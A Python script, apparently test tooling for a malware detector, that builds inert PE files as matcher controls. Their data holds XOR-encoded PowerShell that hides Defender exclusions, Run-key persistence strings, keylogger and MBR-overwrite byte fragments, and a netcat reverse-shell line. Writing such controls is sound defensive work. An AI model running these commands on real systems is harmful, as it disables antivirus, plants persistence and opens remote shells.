"""Generate inert PE matcher controls; every native entry point is RET.

These are structural excerpts, not reconstructed executable malware. The live
specimens supply execution/data-flow evidence; these controls vary matcher legs.
"""
import pathlib, struct, sys
out = pathlib.Path(sys.argv[1]); out.mkdir(parents=True, exist_ok=True)

def pe(name, text=b'', data=b''):
    header = bytearray(512)
    header[:2] = b'MZ'; struct.pack_into('<I', header, 0x3c, 0x80)
    header[0x80:0x84] = b'PE\0\0'
    struct.pack_into('<HHIIIHH', header, 0x84, 0x14c, 2, 0, 0, 0, 224, 0x102)
    o = 0x98
    struct.pack_into('<H', header, o, 0x10b)
    for off, value in [(4,0x4000),(8,0x2000),(16,0x1000),(20,0x1000),
                       (24,0x5000),(28,0x400000),(32,0x1000),(36,0x200),
                       (56,0x7000),(60,0x200),(92,16)]:
        struct.pack_into('<I', header, o+off, value)
    struct.pack_into('<HH', header, o+40, 6, 1)
    struct.pack_into('<HH', header, o+68, 2, 0x8140)
    for i,(nm,rva,offset,size,flags) in enumerate([
        (b'.text',0x1000,0x200,0x4000,0x60000020),
        (b'.data',0x5000,0x4200,0x2000,0xc0000040)]):
        struct.pack_into('<8sIIIIIIHHI',header,0x178+i*40,nm,size,rva,size,offset,0,0,0,0,flags)
    assert len(text)<0x4000 and len(data)<0x2000
    (out/name).write_bytes(header+(b'\xc3'+text).ljust(0x4000,b'\0')+data.ljust(0x2000,b'\0'))

def hx(s):return bytes.fromhex(s)
def xor(s,k):return bytes(c^k for c in s.encode())+b'\0'
command = '-NoProfile -NonInteractive -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath "C:\\Cache" -ExclusionProcess "worker.exe"'
exclusions = xor(command,0x6b)
registration = b'\0'.join(xor(s,k) for s,k in [
    ('Software\\Microsoft\\Windows\\CurrentVersion\\Run',0x41),
    ('RegCreateKeyExW',0x35),('RegSetValueExW',0x72)])
mz = hx('80 3a 4d 0f 85 00 00 00 00 80 7a 01 5a 0f 85 00 00 00 00')
signature = hx('8b 42 3c 80 7d 00 50 80 7d 00 45')
entry = hx('8b 84 24 e4 00 00 00 8b 8c 24 24 01 00 00 01 c8 89 04 24 c7 44 24 04 00 00 00 00 c7 44 24 08 00 00 00 00 c7 44 24 0c 00 00 00 00 c7 44 24 10 00 00 00 00 e8 00 00 00 00')
mapper = mz+signature+b'\x90'*128+entry
imports = b'syscall.GetProcAddress\0syscall.LoadLibrary\0'
pe('mapper-exclusions-run.exe',mapper,imports+exclusions+registration)
pe('mapper-only.exe',mapper,imports)
pe('encoded-data-only.exe',b'',imports+exclusions+registration)
# A different XOR key on ExclusionProcess must not bind to the path command.
split = xor(command.split(' -ExclusionProcess')[0],0x6b)+xor('-ExclusionProcess "worker.exe"',0x13)
pe('different-xor-keys.exe',mapper,imports+split)

poll = hx('07 28 82 00 00 06 20 01 80 ff ff fe 01')
record = hx('02 02 7b 7e 00 00 04 02 28 80 00 00 06 28 0f 00 00 0a 7d 7e 00 00 04 02 02 7b 7e 00 00 04 09 28 0f 00 00 0a 7d 7e 00 00 04')
keyrange = hx('07 17 d6 0b 07 20 ff 00 00 00 31 8f')
keys = b'GetAsyncKeyState\0ToUnicodeEx\0GetForegroundWindow\0'
pe('key-recording.exe',poll+b'\x00'*20+record+keyrange,keys)
pe('key-polling-only.exe',poll+keyrange,keys)
changed = bytearray(record); changed[37] ^= 1
pe('different-record-fields.exe',poll+changed+keyrange,keys)
array = hx('20 00 02 00 00 8d 34 00 00 01 25 d0 77 00 00 04 28 48 00 00 0a')
write = hx('09 74 08 00 00 1b 20 00 02 00 00 12 05 7e 4c 00 00 0a 28 62 00 00 06 26')
files = b'CreateFile\0WriteFile\0'
taunt = b'As you reboot, you find that your MBR has been overwritten.\r\nGame Over.'
pe('sector-taunt.exe',array+write,files+taunt)
pe('sector-writer-only.exe',array+write,files)
pe('taunt-only.exe',b'',files+taunt)
# Native command, port and immediate-store controls.
pe('command-and-port.exe',b'',b'\0nc -e /bin/sh 203.0.113.9 4444\0localhost:27017\0')
pe('identifier-and-padding.exe',b'',b'\xb6nc e 4\0identifier\xcc\x9727017\0')
# Reconstructed native text is still recognized outside the ChaCha initializer.
stores = hx('c7 44 24 10')+b'/bin'+hx('c7 44 24 14')+b'/bas'+hx('c7 44 24 18')+b'h -l'
pe('native-path-immediates.exe',stores)
